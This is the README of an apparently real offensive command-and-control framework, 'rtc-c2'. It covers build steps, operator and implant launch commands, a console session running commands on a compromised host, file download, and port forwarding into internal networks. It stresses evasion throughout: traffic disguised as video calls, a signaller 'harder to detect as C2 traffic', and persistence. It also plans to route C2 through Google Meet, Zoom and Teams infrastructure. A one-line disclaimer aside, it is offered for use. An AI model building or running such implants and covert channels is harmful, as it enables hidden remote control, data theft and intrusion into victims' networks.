# rtc-c2 

work in progress...check back for updates xo....

**WebRTC-based Command & Control framework.** Direct TCP forward over encrypted WebRTC data channels — like SSH `-L` style port forwarding, but nested inside DTLS tunnels.

```text
┌─────────────────┐    ┌──────────────────────┐    ┌──────────────────┐
│    Operator     │    │   TURN/STUN Relay    │    │     Beacon       │
│  (C2 Server)    │───▶│   (Provider Infra)   │◀───│   (Implant)      │
│                 │    │   ── DTLS tunnel ──▶ │    │                  │
│  - Direct fwd   │    │   Encrypted WebRTC   │    │  - Task executor │
│  - Task disptch │    │   data channel       │    │  - Tunnel fwd    │
│  - Console      │    │   Indistinguishable  │    │  - Persistence   │
│  - WS signaller │    │   from video calls   │    │                  │
└─────────────────┘    └──────────────────────┘    └──────────────────┘
```
## Disclaimer: For authorized security testing or educational purposes only.

--

## Features

| Component | Means |
|-----------|-------|
| Transport | Pion WebRTC + Google STUN |
| Signaller | HTTP or **WebSocket** rendezvous (WS = stealthier) |
| Tunnel | **Direct TCP forward** over WebRTC |
| Protocol | JSON envelope over DTLS |

### Ghost Calls (Roadmap)

| Component | Means |
|-----------|-------|
| Transport | Provider TURN (Zoom/Google/Teams) |
| Signaller | Meeting invitation protocol |
| Tunnel | Direct TCP over provider media relay |
| Auth | Meeting join credentials (ephemeral) |
| Infra | **Zero** — no VPS, no domains, no certs |

## Requirements

- Go 1.21+

## Build

```bash
git clone https://github.com/h0mi3e/rtc-c2
cd rtc-c2
make build
```

Windows/Linux/macOS binaries in `bin/`.

## Quick Start

**Terminal 1 — Operator:**

```bash
./bin/operator -sig-addr :9090 -session my-session
```

**Terminal 2 — Beacon:**

```bash
./bin/beacon -signaller http://127.0.0.1:9090 -session my-session
```

Once a beacon connects:

```
=== rtc-c2 Operator Console ===

> beacons
Connected beacons (1):
------------------------------------------------------------
Beacon ID                 User@Host        OS       Arch
------------------------------------------------------------
hostname-1234...          user@host        linux    amd64

> use hostname-1234
[+] Using beacon abc123def456 (user@host)

 > exec whoami
 [*] Task sent

 > exec uname -a

 > info

 > back
```

## Direct TCP Forward

Use the `forward` command for **direct TCP forwarding** through the beacon:

```bash
# In operator console:
> forward 127.0.0.1:4444 10.0.1.100:80
[+] Forward: 127.0.0.1:4444 -> 10.0.1.100:80 (via active beacon)

> forwards
Active forwards:
  127.0.0.1:4444 -> 10.0.1.100:80 (via beacon)
```

Then in another terminal:

```bash
# Point your browser/tool at localhost:4444
curl http://127.0.0.1:4444/resource

# Or use --resolve for clean hostnames
curl http://internal.corp/resource --resolve internal.corp:80:127.0.0.1
```

Manage forwards:

```bash
> forwards               # list active forwards
> stop-forward :4444      # stop a forward
```

What's happening:
1. Operator listens on `127.0.0.1:4444`
2. Raw TCP data gets wrapped in WebRTC messages → sent to beacon
3. Beacon connects to `10.0.1.100:80` and bridges the connection

## WebSocket Signaller

For stealthier SDP exchange, use WebSocket instead of HTTP polling:

```bash
# Operator
./bin/operator -sig-addr :9090 -session stealth -ws

# Beacon
./bin/beacon -signaller http://127.0.0.1:9090 -session stealth -ws
```

WebSocket signaller keeps a persistent connection — looks like a normal web app data feed instead of HTTP polling. Harder to detect as C2 traffic.

## Commands

### Operator Console

| Command | Description |
|---------|-------------|
| `beacons` | List connected beacons |
| `use <id>` | Open interactive session with beacon |
| `forward <local> <remote>` | Direct TCP forward (SSH -L style) |
| `forwards` | List active forwards |
| `stop-forward <local>` | Stop a forward listener |
| `help` | Show help |
| `exit` | Shut down |

### Beacon Session

| Command | Description |
|---------|-------------|
| `exec <cmd>` | Run command on beacon |
| `info` | Get system info |
| `whoami` | Get user identity |
| `download <path>` | Download file from beacon |
| `back` | Return to main menu |

## Project Structure

```
rtc-c2/
├── cmd/
│   ├── operator/          # C2 server binary
│   │   └── main.go
│   └── beacon/            # Implant binary
│       ├── main.go
│       └── util.go
├── pkg/
│   ├── transport/         # WebRTC peer connection
│   │   ├── config.go
│   │   └── peer.go
│   ├── signaller/         # SDP exchange (HTTP + WebSocket)
│   │   ├── signaller.go
│   │   └── websocket.go
│   ├── protocol/          # C2 message protocol
│   │   ├── message.go
│   │   └── task.go
│   └── tunnel/            # Direct TCP forward over WebRTC
│       ├── listener.go    # Operator-side forward listener
│       └── forward.go     # Beacon-side connection forwarder
├── bin/                   # Build output
├── Makefile
├── go.mod / go.sum
└── README.md
```

## Ghost Calls Roadmap

The long game is zero-infrastructure C2 by piggybacking on provider WebRTC infra:

- **Google Meet:** Create meeting via API → beacon joins → Google's TURN relays issued → everything runs through Google's infrastructure
- **Jitsi Meet:** Self-hosted WebRTC — free, open, full control
- **Zoom:** Reverse-engineer proprietary WebRTC auth flow
- **Teams:** SAML/OAuth token → TURN relay auth

| Phase | What | Infra Needed |
|-------|------|-------------|
| 1 | Dev mode (HTTP/WS signaller) | LAN or same VPC |
| 2 | Self-hosted TURN (coturn) | VPS with UDP open |
| 3 | Jitsi Meet integration | Jitsi server or meet.jit.si |
| 4 | Google Meet integration | None — just a Gmail bot |
| 5 | Zoom + Teams | None — join existing infra |

## Adding New Task Types

1. Add a `TaskType` constant in `pkg/protocol/task.go`
2. Add args struct if needed
3. Add handler case in `beacon/main.go`'s `executeTask()`

---

Built by **ek0ms**  — Church of Malware
